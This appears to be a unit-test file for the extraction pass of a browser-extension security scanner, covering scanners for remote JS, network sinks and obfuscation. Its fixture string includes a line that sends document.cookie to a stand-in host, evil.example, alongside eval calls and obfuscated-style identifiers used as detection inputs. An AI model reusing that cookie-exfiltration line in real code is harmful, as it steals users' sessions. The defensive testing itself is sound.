// Unit tests for the single-parse extraction pass and its accessors: the pass
// produces, per source on src.extracted, the SAME per-file results a direct scanner
// call would (so migrating a consumer to the precomputed field cannot change a
// finding), gates content extraction on authored-ness, and retains no AST. The xOf()
// accessors read the precomputed value or recompute when the pass did not run.

import { test } from "node:test";
import assert from "node:assert/strict";

import {
  runExtractionPass,
  remoteJsOf,
  moduleSyntaxOf,
} from "../../src/checks/extract.js";
import { scanRemoteJs } from "../../src/parse/remote-js.js";
import { scanNetworkSinks } from "../../src/parse/network-sinks.js";
import { scanCoreSymbols } from "../../src/parse/core-symbols.js";
import { parseApiUsage } from "../../src/parse/api-usage.js";

const src = (file, code) => ({ file, code, lineOffset: 0, inline: false });

const RICH =
  'eval(x); fetch("https://evil.example/" + document.cookie); ' +
  "Services.wm.get(); browser.tabs.query({});";

test("populates src.extracted with results equal to a direct scanner call", () => {
  const sources = [src("app.js", RICH)];
  runExtractionPass(sources);
  const { extracted } = sources[0];
  assert.deepEqual(extracted.remoteJs.hits, scanRemoteJs(RICH, 0).hits);
  assert.deepEqual(extracted.networkSinks.hits, scanNetworkSinks(RICH, 0).hits);
  assert.deepEqual(extracted.coreSymbols.hits, scanCoreSymbols(RICH, 0).hits);
  assert.deepEqual(extracted.apiUsage.usages, parseApiUsage(RICH, 0).usages);
  assert.equal(extracted.apiUsage.parseError, null);
  // Only summaries are retained - never the AST.
  assert.equal(sources[0].parsed, undefined);
  assert.ok(!("ast" in extracted));
});

test("skips content extraction for a non-authored file", () => {
  const sources = [src("vendor/lib.js", RICH)];
  runExtractionPass(sources, { nonAuthored: new Set(["vendor/lib.js"]) });
  const { extracted } = sources[0];
  assert.equal(
    extracted.remoteJs,
    undefined,
    "no content scan on a non-authored file"
  );
  assert.equal(extracted.networkSinks, undefined);
  assert.ok(extracted.apiUsage, "api-usage still runs on every file");
  assert.ok(extracted.localImports, "load-graph refs run on every file");
});

test("a rejected Experiment runs no content scan", () => {
  const sources = [src("exp.js", RICH)];
  runExtractionPass(sources, { invalidExperiment: true });
  assert.equal(sources[0].extracted.remoteJs, undefined);
  assert.ok(sources[0].extracted.apiUsage);
});

test("results still match a direct scan for pathological input", () => {
  const code = "function(){"; // incomplete - exercises the parse-error path
  const sources = [src("weird.js", code)];
  runExtractionPass(sources);
  assert.deepEqual(
    sources[0].extracted.remoteJs.hits,
    scanRemoteJs(code, 0).hits
  );
});

test("accessors read the precomputed result, or recompute when the pass did not run", () => {
  const withPass = src("a.js", RICH);
  runExtractionPass([withPass]);
  assert.equal(remoteJsOf(withPass), withPass.extracted.remoteJs);
  // A source the pass never ran on (shipped view / hand-built ctx): recompute.
  const noPass = src("b.js", RICH);
  assert.deepEqual(remoteJsOf(noPass).hits, scanRemoteJs(RICH, 0).hits);
});

test("records module-syntax loc + moduleSyntaxOf reads it or recomputes", () => {
  const mod = src("mod.js", "import x from './y.js'; x();");
  const classic = src("classic.js", "var x = 1; x();");
  runExtractionPass([mod, classic]);
  assert.ok(mod.extracted.moduleSyntaxLoc, "import loc recorded on the pass");
  assert.equal(
    classic.extracted.moduleSyntaxLoc,
    null,
    "no module syntax -> null (not undefined)"
  );
  // The accessor returns the precomputed loc when the pass ran...
  assert.equal(moduleSyntaxOf(mod), mod.extracted.moduleSyntaxLoc);
  // ...and recomputes for a source the pass never ran on (the SCA shipped view).
  const noPass = src("late.js", "export const z = 1;");
  assert.ok(moduleSyntaxOf(noPass), "recomputes when the pass did not run");
});

test("extracts experimentRefs only when Experiment namespaces are supplied", () => {
  const code = 'browser.myapi.registerScript("exp/inject.js");';
  const withNs = src("bg.js", code);
  runExtractionPass([withNs], { experimentNamespaces: new Set(["myapi"]) });
  assert.ok(withNs.extracted.experimentRefs.refs.length, "refs extracted");
  const withoutNs = src("bg.js", code);
  runExtractionPass([withoutNs]);
  assert.equal(withoutNs.extracted.experimentRefs, undefined);
});

test("records each candidate's obfuscation verdict + gates content on a positive one", () => {
  // >=5 `_0x…` identifiers -> obfuscationFrom returns true (see bundled.js).
  const obf =
    "var _0x1111=1,_0x2222=2,_0x3333=3,_0x4444=4,_0x5555=5; eval(_0x1111);";
  const bundle = src("bundle.js", obf);
  runExtractionPass([bundle], {
    obfuscationCandidates: new Set(["bundle.js"]),
  });
  assert.equal(bundle.extracted.obfuscation, true, "AST verdict recorded");
  assert.equal(
    bundle.extracted.remoteJs,
    undefined,
    "an obfuscated candidate is content-gated out"
  );
  // A non-obfuscated candidate records false and is still content-scanned.
  const clean = src("app.js", "eval(x);");
  runExtractionPass([clean], {
    obfuscationCandidates: new Set(["app.js"]),
  });
  assert.equal(clean.extracted.obfuscation, false);
  assert.ok(
    clean.extracted.remoteJs,
    "authored non-obfuscated candidate is scanned"
  );
});
